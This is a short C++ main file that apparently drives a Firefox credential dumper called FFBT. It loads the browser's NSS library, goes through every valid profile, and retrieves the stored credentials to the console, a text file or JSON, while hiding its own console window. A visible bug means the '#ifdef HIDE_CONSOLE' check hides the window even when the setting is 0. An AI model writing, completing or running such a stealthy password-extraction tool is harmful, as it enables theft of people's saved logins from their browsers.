#include "ffbt.hxx"

#define HIDE_CONSOLE 0 /* 0=NO 1=YES */
#define OUTPUT_TYPE 0 /* 0=console 1=txt 2=json */

int main()
{
    #ifdef HIDE_CONSOLE
        ShowWindow(GetConsoleWindow(), SW_HIDE);
    #endif

    std::filesystem::path nss_dir = get_nss_location();
    std::vector<std::filesystem::path> valid_profiles = get_valid_profiles();

    FFBT ffbt;
    if (ffbt.Load_NSS(nss_dir) == false) { ffbt.NSS_KILL(); return 0; }
    
    for (auto profile = begin(valid_profiles); profile != end(valid_profiles); ++profile)
    {
        if ( ffbt.Initialize_Profile(*profile)                == false ) { std::cerr << "\nAn Error Occurred. Exiting\n"; ffbt.NSS_KILL(); return 0; }
        if ( ffbt.Check_Authentication()                      == false ) { std::cerr << "\nAn Error Occurred. Exiting\n"; ffbt.NSS_KILL(); return 0; }
        if ( ffbt.retrieve_credentials(*profile, OUTPUT_TYPE) == false ) { std::cerr << "\nAn Error Occurred. Exiting\n"; ffbt.NSS_KILL(); return 0; }
    }

    ffbt.NSS_KILL();
    return 0;
}